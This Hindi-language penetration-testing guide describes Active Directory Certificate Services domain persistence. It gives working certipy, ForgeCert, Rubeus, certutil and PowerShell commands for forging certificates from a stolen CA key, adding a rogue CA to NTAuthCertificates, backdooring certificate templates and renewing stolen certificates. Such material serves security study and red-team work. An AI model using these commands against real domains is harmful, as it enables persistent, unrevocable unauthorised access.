# AD CS डोमेन में स्थायित्व

{{#include ../../../banners/hacktricks-training.md}}

**यह [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) में साझा की गई डोमेन में स्थायित्व की तकनीकों का सारांश है**। अधिक जानकारी के लिए इसे देखें।<sup>[[5]](#references)</sup>

## चोरी किए गए CA सर्टिफ़िकेट से सर्टिफ़िकेट बनाना (Golden Certificate) - DPERSIST1

आप कैसे पता लगा सकते हैं कि कोई सर्टिफ़िकेट CA सर्टिफ़िकेट है?

यह पता लगाया जा सकता है कि कोई सर्टिफ़िकेट CA सर्टिफ़िकेट है, यदि कई शर्तें पूरी होती हैं:<sup>[[5]](#references)</sup>

- सर्टिफ़िकेट CA सर्वर पर संग्रहीत होता है और उसकी निजी कुंजी मशीन के DPAPI द्वारा, या ऑपरेटिंग सिस्टम के समर्थन पर TPM/HSM जैसे हार्डवेयर द्वारा सुरक्षित होती है।
- सर्टिफ़िकेट के Issuer और Subject, दोनों फ़ील्ड CA के distinguished name से मेल खाते हैं।
- "CA Version" एक्सटेंशन केवल CA सर्टिफ़िकेट में मौजूद होता है।
- सर्टिफ़िकेट में Extended Key Usage (EKU) फ़ील्ड नहीं होते।

इस सर्टिफ़िकेट की निजी कुंजी निकालने के लिए, CA सर्वर पर `certsrv.msc` टूल का बिल्ट-इन GUI के ज़रिए उपयोग करना समर्थित तरीका है। फिर भी, यह सर्टिफ़िकेट सिस्टम में संग्रहीत अन्य सर्टिफ़िकेट से अलग नहीं है; इसलिए, इसे निकालने के लिए [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) जैसे तरीके अपनाए जा सकते हैं।

सर्टिफ़िकेट और निजी कुंजी को Certipy से भी इस कमांड का उपयोग करके प्राप्त किया जा सकता है:<sup>[[2]](#references)</sup>

```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```

CA certificate और उसकी private key को `.pfx` format में प्राप्त करने के बाद, वैध certificates बनाने के लिए [ForgeCert](https://github.com/GhostPack/ForgeCert) जैसे tools का उपयोग किया जा सकता है:

```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```

> [!WARNING]
> Certificate forgery के लिए लक्षित user का active होना और process के सफल होने के लिए Active Directory में authenticate कर पाना आवश्यक है। krbtgt जैसे special accounts के लिए certificate forge करना बेअसर है।

यह forged certificate निर्दिष्ट end date तक **valid** रहेगा और **जब तक root CA certificate valid है** तब तक भी valid रहेगा (आमतौर पर 5 से **10+ years** तक)। यह **machines** के लिए भी valid है, इसलिए **S4U2Self** के साथ मिलाकर, attacker CA certificate के valid रहने तक **किसी भी domain machine पर persistence बनाए रख सकता है**।\
इसके अलावा, इस method से **generate किए गए certificates** को **revoke नहीं किया जा सकता**, क्योंकि CA को इनके बारे में पता नहीं होता।

### Strong Certificate Mapping Enforcement (2025+) के तहत काम करना

11 फरवरी, 2025 से (KB5014754 rollout के बाद), domain controllers certificate mappings के लिए default रूप से **Full Enforcement** लागू करते हैं। व्यावहारिक रूप से इसका अर्थ है कि आपके forged certificates को इनमें से कोई एक शर्त पूरी करनी होगी:

- Target account से strong binding शामिल हो (उदाहरण के लिए, SID security extension), या
- Target object के `altSecurityIdentities` attribute पर strong, explicit mapping मौजूद हो।<sup>[[1]](#references)</sup>

Persistence के लिए एक भरोसेमंद तरीका है कि चोरी किए गए Enterprise CA से chain होने वाला forged certificate mint करें और फिर victim principal पर strong explicit mapping जोड़ें:

```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```

नोट्स
- अगर आप ऐसे forged certificates बना सकते हैं जिनमें SID security extension शामिल हो, तो Full Enforcement के तहत भी वे implicitly map होंगे। अन्यथा, explicit strong mappings को प्राथमिकता दें। explicit mappings के बारे में अधिक जानकारी के लिए [account-persistence](account-persistence.md) देखें।
- यहाँ revocation से defenders को मदद नहीं मिलती: forged certificates CA database में अज्ञात होते हैं, इसलिए उन्हें revoke नहीं किया जा सकता।

#### Full-Enforcement के साथ संगत forging (SID-aware)

अपडेट किए गए tooling से आप SID को सीधे embed कर सकते हैं, जिससे DCs के weak mappings को reject करने पर भी golden certificates उपयोग करने योग्य रहते हैं:<sup>[[3]](#references)</sup>

```bash
# Certify 2.0 integrates ForgeCert and can embed SID
Certify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \
  --upn administrator@corp.local --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
  --outfile administrator_sid.pfx

# Certipy also supports SID in forged certs
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \
  -sid S-1-5-21-1111111111-2222222222-3333333333-500 -out administrator_sid.pfx
```

SID एम्बेड करके आप `altSecurityIdentities` को छूने से बचते हैं, जिसकी निगरानी हो सकती है, और फिर भी strong mapping checks की शर्त पूरी होती है।

## Trusting Rogue CA Certificates - DPERSIST2

`NTAuthCertificates` object में `cacertificate` attribute के अंतर्गत एक या अधिक **CA certificates** रखे जाते हैं, जिनका उपयोग Active Directory (AD) करता है। **domain controller** द्वारा verification process में `NTAuthCertificates` object को यह देखने के लिए जांचा जाता है कि उसमें authenticating **certificate** के Issuer field में निर्दिष्ट **CA** से मेल खाने वाली entry है या नहीं। मेल मिलने पर authentication आगे बढ़ता है।<sup>[[5]](#references)</sup>

यदि किसी attacker का इस AD object पर नियंत्रण है, तो वह `NTAuthCertificates` object में एक self-signed CA certificate जोड़ सकता है। आम तौर पर, केवल **Enterprise Admin** group के members और **forest root के domain** में **Domain Admins** या **Administrators** को इस object को modify करने की permission होती है। वे `certutil.exe` के साथ `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA` command चलाकर या [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool) का उपयोग करके `NTAuthCertificates` object को edit कर सकते हैं।

इस technique के लिए कुछ अन्य उपयोगी commands:

```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```

यह capability विशेष रूप से तब प्रासंगिक है, जब इसे ForgeCert का उपयोग करके certificates को dynamically generate करने की पहले बताई गई method के साथ इस्तेमाल किया जाए।

> 2025 के बाद की mapping संबंधी बातें: NTAuth में rogue CA जोड़ने से केवल issuing CA पर trust स्थापित होता है। DCs के **Full Enforcement** में होने पर logon के लिए leaf certificates इस्तेमाल करने के लिए, leaf में SID security extension होना चाहिए या target object पर strong explicit mapping होनी चाहिए (उदाहरण के लिए, `altSecurityIdentities` में Issuer+Serial)। {{#ref}}account-persistence.md{{#endref}} देखें।

## दुर्भावनापूर्ण गलत कॉन्फ़िगरेशन - DPERSIST3

AD CS components के **security descriptor modifications** के ज़रिए **persistence** के अवसर बहुत हैं। "[Domain Escalation](domain-escalation.md)" section में बताए गए modifications को elevated access वाले attacker द्वारा दुर्भावनापूर्ण रूप से लागू किया जा सकता है। इसमें संवेदनशील components, जैसे कि इन पर "control rights" (उदाहरण के लिए, WriteOwner/WriteDACL/आदि) जोड़ना शामिल है:<sup>[[5]](#references)</sup>

- **CA server का AD computer** object
- **CA server का RPC/DCOM server**
- **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** में मौजूद कोई भी **descendant AD object या container** (उदाहरण के लिए, Certificate Templates container, Certification Authorities container, NTAuthCertificates object आदि)
- संगठन द्वारा स्पष्ट रूप से CA या template control rights सौंपे गए **AD groups**। बिल्ट-इन Cert Publishers group को AD में user objects पर certificates publish करने की अनुमति है; केवल इसकी membership से CA या template control अथवा enrollment rights नहीं मिलते। CA और template permissions अलग-अलग जाँचें। [Cert Publishers के बारे में Microsoft का विवरण](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers) और [certificate template permissions](https://learn.microsoft.com/en-us/intune/configmgr/protect/plan-design/planning-for-certificate-template-permissions) देखें।

दुर्भावनापूर्ण तरीके से इसे लागू करने के उदाहरण में, domain में **elevated permissions** रखने वाला attacker, डिफ़ॉल्ट **`User`** certificate template में **`WriteOwner`** permission जोड़ सकता है और उस right का principal स्वयं बन सकता है। इसका exploit करने के लिए attacker पहले **`User`** template का ownership अपने नाम करेगा। इसके बाद, template पर **`mspki-certificate-name-flag`** को **1** पर सेट करके **`ENROLLEE_SUPPLIES_SUBJECT`** सक्षम किया जाएगा, जिससे user request में Subject Alternative Name दे सकेगा। फिर attacker **template** का उपयोग करके **enroll** कर सकता है, alternative name के रूप में **domain administrator** का नाम चुन सकता है और प्राप्त certificate से DA के रूप में authenticate कर सकता है।

लंबे समय तक domain persistence के लिए attackers जो व्यावहारिक settings बदल सकते हैं (पूरे विवरण और detection के लिए {{#ref}}domain-escalation.md{{#endref}} देखें):

- CA policy flags, जो requesters को SAN देने की अनुमति देते हैं (उदाहरण के लिए, `EDITF_ATTRIBUTESUBJECTALTNAME2` सक्षम करना)। इससे ESC1-जैसे रास्ते exploitable बने रहते हैं।
- Template DACL या ऐसी settings, जो authentication-capable issuance की अनुमति देती हैं (उदाहरण के लिए, Client Authentication EKU जोड़ना, `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` सक्षम करना)।
- `NTAuthCertificates` object या CA containers को नियंत्रित करना, ताकि defenders द्वारा cleanup करने की कोशिश पर rogue issuers को लगातार फिर से जोड़ा जा सके।

> [!TIP]
> KB5014754 के बाद hardened environments में, इन गलत कॉन्फ़िगरेशन्स को explicit strong mappings (`altSecurityIdentities`) के साथ जोड़ने से यह सुनिश्चित होता है कि आपके जारी किए गए या forged certificates तब भी इस्तेमाल किए जा सकें, जब DCs strong mapping लागू करें।

### Persistence के लिए certificate renewal का दुरुपयोग (ESC14)

यदि आप authentication-capable certificate (या Enrollment Agent certificate) को compromise करते हैं, तो आप इसे **अनिश्चित काल तक renew कर सकते हैं**, बशर्ते issuing template प्रकाशित रहे और आपका CA issuer chain पर trust करता रहे। Renewal से मूल identity bindings बनी रहती हैं, लेकिन validity बढ़ जाती है। इसलिए, जब तक template ठीक न किया जाए या CA को फिर से publish न किया जाए, इसे हटाना मुश्किल होता है।<sup>[[4]](#references)</sup>

```bash
# Renew a stolen user cert to extend validity
certipy req -ca CORP-DC-CA -template User -pfx stolen_user.pfx -renew -out user_renewed_2026.pfx

# Renew an on-behalf-of cert issued via an Enrollment Agent
certipy req -ca CORP-DC-CA -on-behalf-of 'CORP/victim' -pfx agent.pfx -renew -out victim_renewed.pfx
```

यदि domain controllers **Full Enforcement** में हैं, तो `-sid <victim SID>` जोड़ें (या ऐसा template इस्तेमाल करें जिसमें SID security extension अब भी शामिल हो), ताकि renewed leaf certificate, `altSecurityIdentities` को छुए बिना, मज़बूती से map होता रहे। CA admin अधिकार वाले attackers, खुद को cert जारी करने से पहले, renewed lifetimes बढ़ाने के लिए `policy\RenewalValidityPeriodUnits` में बदलाव भी कर सकते हैं।<sup>[[2]](#references)[[4]](#references)</sup>


## References

- [1] [Microsoft KB5014754 – Windows domain controllers पर certificate-based authentication में बदलाव (enforcement समयरेखा और strong mappings)](https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [2] [Certipy – Command Reference और forge/auth का उपयोग](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [3] [SpecterOps – Certify 2.0 (SID support के साथ integrated forge)](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [ESC14 renewal abuse का अवलोकन](https://www.adcs-security.com/attacks/esc14)
- [5] [SpecterOps – Certified Pre-Owned: Active Directory Certificate Services का दुरुपयोग](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)
{{#include ../../../banners/hacktricks-training.md}}
